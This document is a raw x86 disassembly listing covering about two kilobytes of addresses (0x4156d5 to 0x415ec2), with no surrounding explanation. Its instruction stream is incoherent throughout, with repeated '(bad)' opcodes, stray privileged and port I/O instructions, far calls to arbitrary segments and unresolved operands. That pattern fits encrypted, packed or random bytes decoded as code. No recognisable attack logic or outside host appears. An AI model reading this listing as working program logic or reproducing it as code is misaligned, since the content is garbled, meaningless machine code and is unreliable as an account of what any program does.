  4156d5:	sbb    edx,DWORD PTR ds:0xaaf7087d
  4156db:	(bad)  
  4156dc:	cdq    
  4156dd:	xor    al,cl
  4156df:	gs cli 
  4156e1:	cmp    esp,DWORD PTR [edx-0x13]
  4156e4:	jns    0x4156fa
  4156e6:	fsub   DWORD PTR [ebx]
  4156e8:	sub    esp,DWORD PTR [edi+0x100cedf8]
  4156ee:	xor    al,0xc
  4156f0:	xor    ecx,DWORD PTR [edi+edi*2-0x13]
  4156f4:	add    al,0x73
  4156f6:	les    ebp,FWORD PTR [eax+0x22a75053]
  4156fc:	test   ecx,esi
  4156fe:	xchg   edx,eax
  4156ff:	cmc    
  415700:	or     ah,BYTE PTR [ebp+0x4985cc84]
  415706:	or     edi,DWORD PTR [eax+0x35]
  415709:	sub    BYTE PTR [esi-0x1f15bd80],dl
  41570f:	leave  
  415710:	popa   
  415711:	pop    ds
  415712:	xor    esi,ecx
  415714:	sbb    dl,dl
  415716:	jmp    0xbcd0ac11
  41571b:	loopne 0x4156b4
  41571d:	clc    
  41571e:	ror    BYTE PTR [ecx+ebp*8+0x64d4bca9],0xab
  415726:	shl    DWORD PTR [eax],1
  415728:	addr16 out 0xb6,al
  41572b:	lods   eax,DWORD PTR ds:[esi]
  41572c:	xlat   BYTE PTR ds:[ebx]
  41572d:	xchg   edx,eax
  41572e:	dec    edi
  41572f:	add    BYTE PTR [ebp+ebp*1+0x72904fda],dh
  415736:	and    ebx,DWORD PTR [edx+0x4a0175cd]
  41573c:	pop    ds
  41573d:	das    
  41573e:	push   es
  41573f:	test   ebp,0x5f2df76a
  415745:	dec    ebx
  415746:	loop   0x4156e8
  415748:	mov    edi,DWORD PTR [edi]
  41574a:	out    0x8c,eax
  41574c:	or     al,0x20
  41574e:	jb     0x415796
  415750:	adc    ch,BYTE PTR [eax]
  415752:	cmp    ebp,edx
  415754:	fimul  WORD PTR ds:0x91cac016
  41575a:	cli    
  41575b:	mov    esp,0xb0dd9299
  415760:	scas   al,BYTE PTR es:[edi]
  415761:	fistp  WORD PTR [ebx+0x48802a8e]
  415767:	add    al,0xc5
  415769:	fwait
  41576a:	jo     0x415796
  41576c:	jbe    0x415789
  41576e:	push   ss
  41576f:	mov    ah,0xc4
  415771:	data16 cli 
  415773:	(bad)  
  415774:	fcmovnbe st,st(4)
  415776:	xchg   ebx,eax
  415777:	test   DWORD PTR [eax+edx*8],eax
  41577a:	jp     0x415725
  41577c:	stc    
  41577d:	stos   BYTE PTR es:[edi],al
  41577e:	lea    ebp,[esi+ecx*4+0x5dc6d6b4]
  415785:	inc    ecx
  415786:	(bad)  
  415787:	sbb    bl,BYTE PTR [edx+edx*4]
  41578a:	xchg   DWORD PTR [ebp-0x5f],ebx
  41578d:	mov    al,0x3d
  41578f:	ds xchg ebp,eax
  415791:	push   esi
  415792:	stc    
  415793:	out    0x2f,eax
  415795:	or     esi,esp
  415797:	cmp    ebx,esi
  415799:	addr16 jbe 0x4157d0
  41579c:	les    ebx,FWORD PTR [ebp+0x4]
  41579f:	push   esi
  4157a0:	lds    ebp,FWORD PTR ds:0x65b6d17b
  4157a6:	push   DWORD PTR [edi-0x67]
  4157a9:	jne    0x4157cb
  4157ab:	outs   dx,DWORD PTR ds:[esi]
  4157ac:	bound  eax,QWORD PTR [ecx+0x50]
  4157af:	dec    esi
  4157b0:	add    dl,BYTE PTR [edi]
  4157b2:	add    al,0xf3
  4157b5:	sub    DWORD PTR [ecx+0x7e],esp
  4157b8:	(bad)  
  4157b9:	xor    dh,BYTE PTR [ecx+edi*1-0x2b]
  4157bd:	test   DWORD PTR [edx+ebp*2-0x2a],edx
  4157c1:	fimul  DWORD PTR [edi-0x4b]
  4157c4:	mov    bl,0xe2
  4157c6:	add    eax,0x46a29dd5
  4157cb:	sub    ebp,ebx
  4157cd:	dec    edi
  4157ce:	and    ebx,edx
  4157d0:	outs   dx,DWORD PTR ds:[esi]
  4157d1:	mul    BYTE PTR [ebx+edx*8]
  4157d4:	call   0x124c:0x16039899
  4157db:	xchg   ebx,eax
  4157dc:	push   es
  4157dd:	call   0x4ae978df
  4157e2:	cmp    eax,0xe74147c7
  4157e7:	mov    dh,0xad
  4157e9:	inc    esp
  4157ea:	loop   0x4157df
  4157ec:	imul   eax,DWORD PTR [ecx+eax*8+0x29],0x45
  4157f1:	xchg   edi,esi
  4157f3:	lahf   
  4157f4:	xchg   esp,eax
  4157f5:	test   edx,ecx
  4157f7:	sbb    ebx,DWORD PTR [ecx]
  4157f9:	mov    eax,DWORD PTR [ebx-0x71150d4e]
  4157ff:	jle    0x41583a
  415801:	and    esi,DWORD PTR [esi+ecx*8-0x6899bdf4]
  415808:	fcmovbe st,st(7)
  41580a:	mov    esi,0x8eb033ce
  41580f:	push   es
  415810:	jns    0x415806
  415812:	mov    al,0x7a
  415814:	xchg   ebx,eax
  415815:	mov    esi,0xbb4b0c1b
  41581a:	es jmp 0x41580f
  41581d:	pop    ebp
  41581e:	xchg   edi,eax
  41581f:	mov    bl,0xb9
  415821:	push   esp
  415822:	(bad)  
  415823:	sbb    eax,0x9740e767
  415828:	jnp    0x415814
  41582a:	fist   DWORD PTR [eax+0x36]
  41582d:	or     al,0x4a
  41582f:	(bad)  
  415831:	inc    ebp
  415832:	popa   
  415833:	fistp  DWORD PTR [esi+0x5]
  415836:	push   edi
  415837:	pop    esi
  415838:	not    DWORD PTR [ebx-0x29]
  41583b:	pop    edi
  41583c:	and    BYTE PTR [edi+0x333de23a],dh
  415842:	xchg   al,ah
  415844:	fmul   DWORD PTR [edi-0x4784b8bc]
  41584a:	call   0x9a442669
  41584f:	leave  
  415850:	lahf   
  415851:	or     BYTE PTR [ecx],bl
  415853:	mov    DWORD PTR [ecx+0x7c],esp
  415856:	outs   dx,DWORD PTR ds:[esi]
  415857:	sub    ecx,esp
  415859:	int    0xa
  41585b:	ret    0xff5a
  41585e:	test   al,0xa
  415860:	jp     0x415836
  415862:	or     esi,DWORD PTR [edx-0x44]
  415865:	mov    cl,0x2d
  415867:	mov    WORD PTR [ebx-0x1687e62c],?
  41586d:	dec    esp
  41586e:	imul   dl
  415870:	jbe    0x4157f4
  415872:	add    al,0x6d
  415874:	jle    0x4158d3
  415876:	push   ss
  415877:	imul   esp,DWORD PTR [ebx],0x419633a4
  41587d:	xchg   edx,eax
  41587e:	aaa    
  41587f:	imul   ebx,ecx,0xffffffb8
  415882:	fwait
  415883:	sbb    al,bl
  415885:	add    BYTE PTR [ebp-0x27],ch
  415888:	pop    edi
  415889:	mov    BYTE PTR [edx-0x47],dl
  41588c:	in     al,0x7d
  41588e:	jne    0x41583d
  415890:	cmp    eax,0xdeff558b
  415895:	lods   eax,DWORD PTR ds:[esi]
  415896:	je     0x4158de
  415898:	mov    ebp,0xe457eb3d
  41589d:	aaa    
  41589e:	xor    esp,DWORD PTR [esp+esi*1-0x35706762]
  4158a5:	sub    DWORD PTR [edx-0x74a3fa56],eax
  4158ab:	cli    
  4158ac:	test   esp,ebx
  4158ae:	sbb    al,BYTE PTR [esi+0x4125f89e]
  4158b4:	addr16 pop ecx
  4158b6:	mov    al,ds:0xd9762539
  4158bb:	sbb    edx,DWORD PTR [edi-0x2d]
  4158be:	cli    
  4158bf:	mov    ah,0x35
  4158c1:	(bad)  
  4158c2:	mov    ds:0x9b74ec15,eax
  4158c7:	sbb    al,0x45
  4158c9:	sub    al,0x6d
  4158cb:	mov    bl,BYTE PTR [eax]
  4158cd:	outs   dx,BYTE PTR ds:[esi]
  4158ce:	sub    DWORD PTR [ecx+0xb],ebp
  4158d1:	fimul  WORD PTR [ebp+0x51]
  4158d4:	in     eax,dx
  4158d5:	nop
  4158d6:	mov    al,0xd5
  4158d8:	fimul  WORD PTR [edx+0x2e46197b]
  4158de:	xor    BYTE PTR [edi-0x55],al
  4158e1:	fsubr  QWORD PTR [eax]
  4158e3:	cmp    bl,BYTE PTR [esi+edi*8-0x6cf996d6]
  4158ea:	pop    ebx
  4158eb:	jno    0x41595b
  4158ed:	and    ah,BYTE PTR [edx-0x6b]
  4158f0:	popf   
  4158f1:	pop    ss
  4158f2:	loop   0x415964
  4158f4:	(bad)  
  4158f5:	mov    edi,0x9b97b609
  4158fa:	iret   
  4158fb:	fiadd  WORD PTR [esi+ecx*8]
  4158fe:	repz arpl di,cx
  415901:	div    DWORD PTR [eax+0x3ea86633]
  415907:	xor    dh,ah
  415909:	fwait
  41590a:	mov    eax,ds:0x97588d11
  41590f:	mov    bl,0xa4
  415911:	xlat   BYTE PTR ds:[ebx]
  415912:	sub    DWORD PTR [edi+edi*2+0x44c4241e],eax
  415919:	or     eax,0xaef04d08
  41591e:	mov    cl,BYTE PTR [edx+esi*1-0x561b9734]
  415925:	sbb    dh,0x7b
  415928:	sub    al,BYTE PTR [edx]
  41592a:	xchg   ebp,eax
  41592b:	xchg   BYTE PTR [edx],dl
  41592d:	sub    eax,0x1b0e35da
  415932:	mov    es,WORD PTR [ecx+0x11872f07]
  415938:	push   esp
  415939:	sahf   
  41593a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41593b:	adc    ecx,DWORD PTR [edi-0x5e]
  41593e:	in     eax,0xb1
  415940:	ja     0x41595e
  415942:	dec    edi
  415943:	loop   0x4158ec
  415945:	pop    esp
  415946:	jns    0x41590f
  415948:	add    DWORD PTR [edx],ebx
  41594a:	ret    
  41594b:	sbb    al,0x86
  41594d:	sti    
  41594e:	inc    ecx
  41594f:	push   eax
  415950:	xchg   ecx,eax
  415951:	inc    ebp
  415952:	mov    eax,ds:0x40a4188c
  415957:	mov    esp,0xef6d1727
  41595c:	xchg   ebp,eax
  41595d:	out    0xbe,eax
  41595f:	in     al,dx
  415960:	ret    0x3c3b
  415963:	outs   dx,BYTE PTR ds:[esi]
  415964:	xor    eax,0xf7cda769
  415969:	icebp  
  41596a:	inc    esi
  41596b:	enter  0x8671,0xb4
  41596f:	leave  
  415970:	cmp    BYTE PTR [edx],dh
  415972:	jge    0x4158f8
  415974:	lds    edx,FWORD PTR [edi+0x3054e5fb]
  41597a:	frstor [edi]
  41597c:	cld    
  41597d:	ja     0x4159a4
  41597f:	arpl   WORD PTR [edx],ax
  415981:	pop    ebp
  415982:	pop    esi
  415983:	xchg   edx,eax
  415984:	push   ecx
  415985:	out    dx,al
  415986:	ds gs pop edx
  415989:	repz pushf 
  41598b:	add    eax,0xd018272a
  415990:	sbb    esp,ebp
  415992:	pop    esp
  415993:	pop    ss
  415994:	js     0x415954
  415996:	hlt    
  415997:	iret   
  415998:	out    0x6a,al
  41599a:	ret    
  41599b:	sbb    BYTE PTR [esi-0x52fc1d17],0x40
  4159a2:	(bad)  
  4159a3:	call   0x2f17:0xe990338a
  4159aa:	dec    eax
  4159ab:	push   esp
  4159ac:	loop   0x415971
  4159ae:	sub    DWORD PTR ds:0x50246f6b,0xe863b300
  4159b8:	fcmovbe st,st(3)
  4159ba:	int    0x54
  4159bc:	ins    BYTE PTR es:[edi],dx
  4159bd:	mov    bl,0x6
  4159bf:	ins    BYTE PTR es:[edi],dx
  4159c0:	into   
  4159c1:	int3   
  4159c2:	cwde   
  4159c3:	mov    al,0xf8
  4159c5:	loope  0x415989
  4159c7:	cli    
  4159c8:	cmc    
  4159c9:	inc    edx
  4159ca:	jp     0x4159ab
  4159cc:	fiadd  WORD PTR [edi+0x57]
  4159cf:	loope  0x41595b
  4159d1:	pop    es
  4159d2:	adc    DWORD PTR [edx-0x4d],esi
  4159d5:	(bad)  
  4159d7:	iret   
  4159d8:	xor    dl,BYTE PTR [ecx+0x4234483a]
  4159de:	pop    es
  4159df:	cmp    edi,DWORD PTR [ecx+eiz*2]
  4159e2:	xor    al,0x37
  4159e4:	xor    BYTE PTR [ebx+eiz*8+0x38c6b781],cl
  4159eb:	sbb    eax,esi
  4159ed:	adc    al,0x5a
  4159ef:	push   ss
  4159f0:	popf   
  4159f1:	mov    dl,0x42
  4159f3:	pop    edi
  4159f4:	push   0x4
  4159f6:	ja     0x415a5c
  4159f8:	xor    BYTE PTR [esi+0xf],bh
  4159fb:	dec    ecx
  4159fc:	loopne 0x415a29
  4159fe:	in     al,0x94
  415a00:	bound  ecx,QWORD PTR ds:0xbf204930
  415a06:	pop    esp
  415a07:	ss or  al,0x5c
  415a0a:	(bad)  
  415a0b:	ja     0x4159fc
  415a0d:	into   
  415a0e:	lods   al,BYTE PTR ds:[esi]
  415a0f:	int3   
  415a10:	mov    edi,0x69fab4b6
  415a15:	pop    edx
  415a16:	imul   ecx,DWORD PTR [ebx+0x1a],0xf3e8026
  415a1d:	inc    edx
  415a1e:	adc    al,0xd9
  415a20:	push   0x42
  415a22:	lds    esp,FWORD PTR [esi-0x49c9cf38]
  415a28:	and    BYTE PTR [eax-0x59f872be],ah
  415a2e:	jo     0x415a29
  415a30:	mov    ah,0x28
  415a32:	dec    eax
  415a33:	aam    0xc1
  415a35:	xor    BYTE PTR [edx],0xc1
  415a38:	dec    edx
  415a39:	pop    ss
  415a3a:	mov    ecx,DWORD PTR fs:[esi]
  415a3d:	lods   eax,DWORD PTR ds:[esi]
  415a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a3f:	daa    
  415a40:	shl    DWORD PTR [edi+0x30],1
  415a43:	jecxz  0x415a51
  415a45:	dec    ebx
  415a46:	pop    edx
  415a47:	ins    BYTE PTR es:[edi],dx
  415a48:	sar    edx,cl
  415a4a:	mov    ah,0xcd
  415a4c:	xchg   edi,eax
  415a4d:	cmp    BYTE PTR [ecx],0xb8
  415a50:	add    eax,0x681806a0
  415a55:	lods   eax,DWORD PTR ds:[esi]
  415a56:	push   ds
  415a57:	pushf  
  415a58:	sub    esi,ebx
  415a5a:	in     eax,0x22
  415a5c:	jge    0x415a2f
  415a5e:	mov    cl,0x25
  415a60:	or     DWORD PTR [esi+0x771f6030],ebx
  415a66:	mov    edi,0xf63fcfe
  415a6b:	fidiv  DWORD PTR [edi-0x3]
  415a6e:	xor    BYTE PTR [eax+0x633a3108],al
  415a74:	or     al,0x4f
  415a76:	test   eax,0x3fdcb5dd
  415a7b:	xchg   esp,eax
  415a7c:	aaa    
  415a7d:	or     al,0x9d
  415a7f:	dec    edx
  415a80:	mov    gs,WORD PTR [ecx+0x38]
  415a83:	add    esp,0xffffffed
  415a86:	adc    ecx,DWORD PTR [esp+edx*4-0x43cd8229]
  415a8d:	rcl    esi,cl
  415a8f:	iret   
  415a90:	adc    eax,0x5300aa5d
  415a95:	sti    
  415a96:	retf   0xbdf
  415a99:	aaa    
  415a9a:	bswap  ecx
  415a9c:	ins    DWORD PTR es:[edi],dx
  415a9d:	or     ebp,esi
  415a9f:	imul   ebp,DWORD PTR [ebp+0x3e2df336],0xe64a0d6f
  415aa9:	iret   
  415aaa:	sbb    eax,DWORD PTR [ecx+ecx*4-0x728b1313]
  415ab1:	add    al,0x9b
  415ab3:	aaa    
  415ab4:	or     esp,edx
  415ab6:	sbb    al,0x3f
  415ab8:	cmp    eax,0xf5c78778
  415abd:	ret    0xf679
  415ac0:	adc    DWORD PTR ds:[edi],0xc0b62188
  415ac7:	adc    al,0xb9
  415ac9:	xchg   BYTE PTR [esi],ch
  415acb:	data16 js 0x415ae1
  415ace:	mov    esp,0x17f329be
  415ad3:	dec    esp
  415ad4:	xchg   ebx,eax
  415ad5:	rcl    DWORD PTR [edx+0x7a],cl
  415ad8:	retf   0xe49b
  415adb:	(bad)  
  415adc:	das    
  415add:	xchg   ecx,eax
  415ade:	mov    edi,0x11263086
  415ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ae4:	jl     0x415b35
  415ae6:	sbb    ecx,DWORD PTR [edi+0x77a3c9a5]
  415aec:	and    eax,0x3e66ae72
  415af1:	fiadd  WORD PTR [ebx-0xc]
  415af4:	ret    
  415af5:	fcomp  DWORD PTR [edx]
  415af7:	scas   al,BYTE PTR es:[edi]
  415af8:	test   eax,0xdf4653cd
  415afd:	adc    DWORD PTR [esi],edi
  415aff:	push   ebx
  415b00:	repnz inc ebp
  415b02:	and    BYTE PTR [eax-0x3caa2ca3],ch
  415b08:	fwait
  415b09:	loop   0x415af5
  415b0b:	stos   DWORD PTR es:[edi],eax
  415b0c:	dec    edi
  415b0d:	mov    esp,0xdf4cb969
  415b12:	(bad)  [ecx+0x75]
  415b15:	mov    eax,ds:0x175752e8
  415b1a:	adc    eax,0x1dc2ed8
  415b1f:	ret    0x4624
  415b22:	icebp  
  415b23:	shr    DWORD PTR [ebp+0x53],1
  415b26:	enter  0x6a0e,0x9c
  415b2a:	lods   al,BYTE PTR ds:[esi]
  415b2b:	sub    eax,0xe54cb6ce
  415b30:	sbb    esi,DWORD PTR [esi-0x2b48b1e3]
  415b36:	leave  
  415b37:	or     eax,DWORD PTR ds:0x959f45b4
  415b3d:	sar    DWORD PTR [edi+0xc32d60c],0xb3
  415b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b45:	idiv   BYTE PTR [ecx+0x1bedca45]
  415b4b:	and    eax,0x71a99fbb
  415b50:	retf   0xa042
  415b53:	das    
  415b54:	fist   DWORD PTR [edx+edi*1+0x53]
  415b58:	cmp    DWORD PTR [ebx-0x29d463b0],esp
  415b5e:	xchg   ebp,eax
  415b5f:	rcr    BYTE PTR [esi+0x54],1
  415b62:	mov    ds:0x23a2b35e,al
  415b67:	inc    edi
  415b68:	mov    edi,0x3227d331
  415b6d:	push   esi
  415b6e:	aas    
  415b6f:	fadd   QWORD PTR [eax-0x34d13a4b]
  415b75:	fistp  WORD PTR [ebx+0x405e25dc]
  415b7b:	pop    esi
  415b7c:	pop    es
  415b7d:	and    bh,BYTE PTR [esi]
  415b7f:	mov    esp,0x32ae03a3
  415b84:	mov    al,0x4
  415b86:	mov    ch,0x3f
  415b88:	jae    0x415b4c
  415b8a:	outs   dx,DWORD PTR ds:[esi]
  415b8b:	shr    BYTE PTR fs:[esi+0xd],0x2d
  415b90:	mov    DWORD PTR [ebx+0x187e482a],ecx
  415b96:	push   esi
  415b97:	or     ebx,DWORD PTR [edx]
  415b99:	mov    al,ds:0x1bdedbf2
  415b9e:	pop    ebp
  415b9f:	sbb    bl,cl
  415ba1:	pusha  
  415ba2:	pop    ds
  415ba3:	jbe    0x415c1f
  415ba5:	mov    DWORD PTR ds:0x2c2bac57,edx
  415bab:	fmul   DWORD PTR ds:0xd82f8495
  415bb1:	xchg   esi,eax
  415bb2:	jo     0x415b88
  415bb4:	add    al,0xc3
  415bb6:	(bad)  
  415bb8:	sti    
  415bb9:	mov    ebp,0xffb0f064
  415bbe:	and    ecx,DWORD PTR [ecx-0x5877d33d]
  415bc4:	scas   al,BYTE PTR es:[edi]
  415bc5:	das    
  415bc6:	and    cl,ah
  415bc8:	pop    edx
  415bc9:	and    cl,0x74
  415bcc:	pop    esi
  415bcd:	jge    0x415c39
  415bcf:	fwait
  415bd0:	cli    
  415bd1:	int    0x83
  415bd3:	ret    
  415bd4:	mov    ecx,0xb36b2c1f
  415bd9:	inc    ebp
  415bda:	add    eax,0x171adf8
  415bdf:	xchg   DWORD PTR [eax+eax*2+0x1b],ebx
  415be3:	sbb    ecx,DWORD PTR [ebx+ebx*8+0x78]
  415be7:	sbb    ebx,DWORD PTR [edx+eiz*1+0x17]
  415beb:	mov    edi,0x119e0638
  415bf0:	inc    eax
  415bf1:	test   DWORD PTR [esi],0xb9eb353b
  415bf7:	not    edx
  415bf9:	call   0x45af23d6
  415bfe:	mov    ebp,0xc2984db3
  415c03:	mov    eax,0xea17e3d3
  415c08:	hlt    
  415c09:	outs   dx,BYTE PTR ds:[esi]
  415c0a:	mov    ch,0x3b
  415c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c0d:	or     BYTE PTR [ecx+0x46672c1b],bl
  415c13:	fwait
  415c14:	xor    bl,BYTE PTR [edi]
  415c16:	leave  
  415c17:	jge    0x415c16
  415c19:	test   DWORD PTR [ebp-0x68],0xaa6e744a
  415c20:	inc    esp
  415c21:	cwde   
  415c22:	push   es
  415c23:	sar    BYTE PTR [esi-0x27],0xd6
  415c27:	gs shr esp,cl
  415c2a:	stos   BYTE PTR es:[edi],al
  415c2b:	pop    edx
  415c2c:	push   ebx
  415c2d:	pop    ss
  415c2e:	cli    
  415c2f:	aaa    
  415c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c31:	xchg   edx,eax
  415c32:	ss pop eax
  415c34:	mov    eax,0x6d968b1a
  415c39:	inc    ecx
  415c3a:	ins    DWORD PTR es:[edi],dx
  415c3b:	mov    ecx,0xbdb0ddbe
  415c40:	cmp    DWORD PTR [esi+ecx*1],0x6df5b4c7
  415c47:	pop    edx
  415c48:	xchg   ebp,eax
  415c49:	jl     0x415ca9
  415c4b:	fimul  WORD PTR [ebx-0x7b5a22f]
  415c51:	pop    edx
  415c52:	push   ebp
  415c53:	inc    ecx
  415c54:	or     ecx,DWORD PTR [edi-0x56]
  415c57:	dec    eax
  415c58:	push   ecx
  415c59:	mov    dh,0xc6
  415c5b:	mov    esi,ebp
  415c5d:	test   DWORD PTR [ebx],eax
  415c5f:	or     BYTE PTR [ebx+0x5b8d95d8],ah
  415c65:	mov    eax,0x978b3bd1
  415c6a:	cli    
  415c6b:	ja     0x415c19
  415c6d:	dec    edx
  415c6e:	xor    edx,DWORD PTR [edi]
  415c70:	loope  0x415c0e
  415c72:	lea    eax,ds:0x3d4442b6
  415c78:	test   BYTE PTR [eax-0x5589cb66],bh
  415c7e:	sbb    eax,0xa1051701
  415c83:	(bad)  
  415c84:	jno    0x415cf8
  415c86:	push   cs
  415c87:	sub    esi,DWORD PTR [edx]
  415c89:	jl     0x415cdf
  415c8b:	cs pop es
  415c8d:	sbb    ecx,DWORD PTR [ecx+0x62]
  415c90:	shl    al,cl
  415c92:	pop    ss
  415c93:	jecxz  0x415c66
  415c95:	or     DWORD PTR [esi+0x4b23447f],eax
  415c9b:	sbb    eax,0x4c85d30e
  415ca0:	push   esi
  415ca1:	mov    esp,es
  415ca3:	ficom  WORD PTR [ecx+0x43429701]
  415ca9:	sbb    bl,BYTE PTR [edi]
  415cab:	sbb    DWORD PTR [edi-0xa0347ed],eax
  415cb1:	lods   al,BYTE PTR ds:[esi]
  415cb2:	rcl    dh,0xed
  415cb5:	fst    QWORD PTR [edx-0x14a7ff41]
  415cbb:	push   ebx
  415cbc:	test   al,0x2
  415cbe:	inc    ebx
  415cbf:	push   edi
  415cc0:	mov    ecx,0x7f039e78
  415cc5:	xchg   edi,eax
  415cc6:	outs   dx,DWORD PTR ds:[esi]
  415cc7:	test   BYTE PTR ds:0x4524a12c,dl
  415ccd:	js     0x415cfa
  415ccf:	pop    eax
  415cd0:	in     eax,dx
  415cd1:	in     al,0x7a
  415cd3:	push   esi
  415cd4:	das    
  415cd5:	ins    DWORD PTR es:[edi],dx
  415cd6:	dec    eax
  415cd7:	push   cs
  415cd8:	dec    ebx
  415cd9:	fadd   st(7),st
  415cdb:	imul   ebp,DWORD PTR [ebp-0x47],0x437b56cc
  415ce2:	push   ebx
  415ce3:	cwde   
  415ce4:	jo     0x415c90
  415ce6:	int    0xa0
  415ce8:	mov    eax,ds:0x1f703d28
  415ced:	lods   al,BYTE PTR ds:[esi]
  415cee:	test   DWORD PTR [edx],esp
  415cf0:	add    BYTE PTR [ecx],cl
  415cf2:	xchg   ebx,eax
  415cf3:	push   ecx
  415cf4:	adc    BYTE PTR [ebx],bl
  415cf6:	loope  0x415c80
  415cf8:	stc    
  415cf9:	mov    esi,0x8a157fae
  415cfe:	call   0x798906bc
  415d03:	inc    ebp
  415d04:	xor    edi,DWORD PTR [edx+0x31]
  415d07:	jmp    0x9148:0x6fde6ec8
  415d0e:	jmp    0x415cc0
  415d10:	sahf   
  415d11:	sub    al,0x4e
  415d13:	cwde   
  415d14:	push   es
  415d15:	sub    eax,0xa7abd813
  415d1a:	or     edi,DWORD PTR [edi+0x45]
  415d1d:	repnz leave 
  415d1f:	fadd   QWORD PTR [edi+0x21]
  415d22:	jo     0x415d8c
  415d24:	and    dl,BYTE PTR [esi-0x496dbb63]
  415d2a:	adc    al,0x8f
  415d2c:	mov    ah,0x8c
  415d2e:	jnp    0x415ced
  415d30:	xor    DWORD PTR [ecx+0x4a8ba92d],ebx
  415d36:	aad    0xed
  415d38:	std    
  415d39:	lods   eax,DWORD PTR ds:[esi]
  415d3a:	push   ebp
  415d3b:	cmp    al,0xa
  415d3d:	xchg   ebp,eax
  415d3e:	or     DWORD PTR [eax-0x23ff7951],eax
  415d44:	hlt    
  415d45:	imul   ecx,ecx,0x72
  415d48:	mov    edx,0xff59cfc1
  415d4d:	sub    eax,0x26ba068e
  415d52:	fistp  QWORD PTR [ebp+0x6d62974f]
  415d58:	jbe    0x415d51
  415d5a:	std    
  415d5b:	(bad)  
  415d5c:	mov    dh,0xf9
  415d5e:	int3   
  415d5f:	mov    ebp,0xa86720c5
  415d64:	mov    eax,0x4f28479e
  415d69:	jle    0x415de9
  415d6b:	repz repz cs mov dl,0x93
  415d70:	cmp    al,0x34
  415d72:	cs scas al,BYTE PTR es:[edi]
  415d74:	hlt    
  415d75:	inc    ebp
  415d76:	fwait
  415d77:	xor    BYTE PTR [ecx-0x4f],0x1a
  415d7b:	xchg   DWORD PTR [esi],ebx
  415d7d:	icebp  
  415d7e:	dec    DWORD PTR [eax-0x14]
  415d81:	fisub  WORD PTR [edx-0xf5a9c44]
  415d87:	sbb    al,0x1d
  415d89:	test   eax,0x34cc191
  415d8e:	mov    ch,0x66
  415d90:	inc    ebx
  415d91:	cmp    ah,BYTE PTR [ecx-0x61623360]
  415d97:	sub    eax,DWORD PTR [ecx+0x47]
  415d9a:	push   0x61
  415d9c:	add    al,BYTE PTR [esi-0x57]
  415d9f:	xchg   ah,dl
  415da1:	sub    ebx,DWORD PTR [esi]
  415da3:	xlat   BYTE PTR ds:[ebx]
  415da4:	cmp    BYTE PTR [ecx-0x74c4e550],cl
  415daa:	adc    eax,0xa5223f15
  415daf:	push   edx
  415db0:	inc    ebp
  415db1:	adc    eax,0xd4003e9d
  415db6:	lea    esp,[edx+0x29]
  415db9:	lods   eax,DWORD PTR ds:[esi]
  415dba:	out    dx,al
  415dbb:	jb     0x415dc2
  415dbd:	mov    edi,0x4204b982
  415dc2:	js     0x415db0
  415dc4:	xor    bh,BYTE PTR [ebx-0x54]
  415dc7:	jmp    0x1dfdf2a4
  415dcc:	(bad)  
  415dcd:	pop    eax
  415dce:	mov    dl,0x66
  415dd0:	mov    ds:0x660d8a9a,eax
  415dd5:	aas    
  415dd6:	pop    edi
  415dd7:	fisub  WORD PTR [ebx-0x3b]
  415dda:	mov    ss,ebx
  415ddc:	jns    0x415d82
  415dde:	ja     0x415d74
  415de0:	outs   dx,BYTE PTR ds:[esi]
  415de1:	test   eax,0xf7f1fd95
  415de6:	sbb    cl,BYTE PTR [ecx+0x41419b12]
  415dec:	mov    ss,ecx
  415dee:	stc    
  415def:	retf   0xdcef
  415df2:	push   es
  415df3:	mov    eax,DWORD PTR [edx-0x80]
  415df6:	(bad)  
  415df7:	mov    eax,0x65d491f4
  415dfc:	retf   0x760b
  415dff:	xor    ah,ah
  415e01:	push   edi
  415e02:	sti    
  415e03:	aam    0xde
  415e05:	add    dh,al
  415e07:	loop   0x415e7f
  415e09:	fisubr DWORD PTR [esi-0x1bca7322]
  415e0f:	xor    al,0x1c
  415e11:	call   0xc845:0xc29bf059
  415e18:	lods   eax,DWORD PTR ds:[esi]
  415e19:	shr    BYTE PTR [edx-0x2e9cc502],0x1a
  415e20:	outs   dx,BYTE PTR ds:[esi]
  415e21:	inc    esp
  415e22:	inc    esp
  415e23:	and    eax,0xdb03bbcd
  415e28:	mov    esp,0xf0b2fa9d
  415e2d:	or     dh,bl
  415e2f:	repz pop es
  415e31:	je     0x415e17
  415e33:	fdiv   st,st(5)
  415e35:	pop    edi
  415e36:	or     eax,DWORD PTR [edx+edi*2+0x774f3299]
  415e3d:	loopne 0x415e39
  415e3f:	cmp    BYTE PTR [eax+esi*2-0x46a4b63],0xd8
  415e47:	retf   
  415e48:	bound  ebp,QWORD PTR [eax]
  415e4a:	xchg   ecx,eax
  415e4b:	mov    eax,ds:0xac576b3a
  415e50:	popa   
  415e51:	arpl   bp,di
  415e53:	enter  0xb1e7,0x76
  415e57:	or     esp,eax
  415e59:	xchg   edx,eax
  415e5a:	sub    BYTE PTR [edi-0x62cdcc2f],dh
  415e60:	cmp    al,BYTE PTR [esi]
  415e62:	fwait
  415e63:	sar    BYTE PTR [ecx+0x7d],1
  415e66:	cmp    bh,al
  415e68:	cmp    al,0xdc
  415e6a:	xchg   edi,eax
  415e6b:	jbe    0x415e60
  415e6d:	adc    eax,0x65d0f5d7
  415e72:	fcomp  DWORD PTR [ecx+0x483d1bd8]
  415e78:	pop    ecx
  415e79:	jmp    0x1b7:0x102be771
  415e80:	shr    DWORD PTR [esi+0x7a3f21ad],cl
  415e86:	mov    ebp,0x40162d70
  415e8b:	je     0x415e50
  415e8d:	mov    eax,ds:0xfcc7c7f6
  415e92:	cmp    cl,cl
  415e94:	sbb    esp,DWORD PTR [edi]
  415e96:	nop
  415e97:	dec    esi
  415e98:	nop
  415e99:	xchg   ebx,eax
  415e9a:	jnp    0x415e50
  415e9c:	(bad)  
  415e9d:	xor    al,0xae
  415e9f:	or     BYTE PTR [ebp+eax*1-0x55],ah
  415ea3:	or     BYTE PTR [ebx+ecx*8-0x1926653d],dh
  415eaa:	cmp    dh,BYTE PTR [esi]
  415eac:	mov    ?,WORD PTR ds:0x69723244
  415eb2:	es nop
  415eb4:	call   0xb946:0xc42594da
  415ebb:	repz cmp WORD PTR [ebp+0x26],0xcc63
  415ec2:	loopne 0x415e91
